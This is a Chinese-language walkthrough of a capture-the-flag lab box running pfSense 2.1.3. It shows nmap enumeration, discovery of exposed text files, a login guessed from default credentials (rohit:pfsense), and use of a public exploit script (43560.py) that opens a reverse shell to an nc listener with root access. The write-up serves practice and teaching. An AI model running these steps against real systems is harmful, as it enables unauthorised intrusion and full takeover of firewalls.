kali 10.10.16.5

靶机 10.10.10.60



```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): Comau embedded (92%)
Aggressive OS guesses: Comau C4G robot control unit (92%)
No exact OS matches for host (test conditions non-ideal)
```



```bash
└─# searchsploit lighttpd -m 31396
```



访问 http 80 端口跳转到 https 443

<img src=".\图片\Snipaste_2023-09-08_09-41-32.png" alt="Snipaste_2023-09-08_09-41-32" style="zoom:80%;" />

登录框有 token 字段，好像不方便爆破



假装是字典扫到的，我没扫到

```http
https://10.10.10.60/system-users.txt
```

```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```



再扫不到web上下文了，重新回头看，找相关 cms，新招数，谷歌识图，得到 cms 可能为 pfsense

<img src=".\图片\Snipaste_2023-09-08_10-17-17.png" alt="Snipaste_2023-09-08_10-17-17" style="zoom:67%;" />



```http
https://10.10.10.60/changelog.txt
```

```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```



尝试弱密码

**pfSense**  的默认账号为"admin"，默认密码为"pfsense"。尝试失败，结合以上 `system-users.txt` 信息

```
Rohit:pfsense  失败
rohit:pfsense  成功
```



进入后台，得到版本 `2.1.3-RELEASE`

```
2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014
FreeBSD 8.3-RELEASE-p16
```



```bash
└─# searchsploit pfsense 2.1
```



漏洞利用

```bash
└─# python 43560.py --rhost 10.10.10.60 --lhost 10.10.16.5 --lport 1234 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```

```bash
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [10.10.16.5] from 10.10.10.60 [10.10.10.60] 36345
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
```



心得：目录扫不到时，要回头看看，终点找到web网站的cms及其版本，再漏洞利用

谷歌识图 找 cms 用上
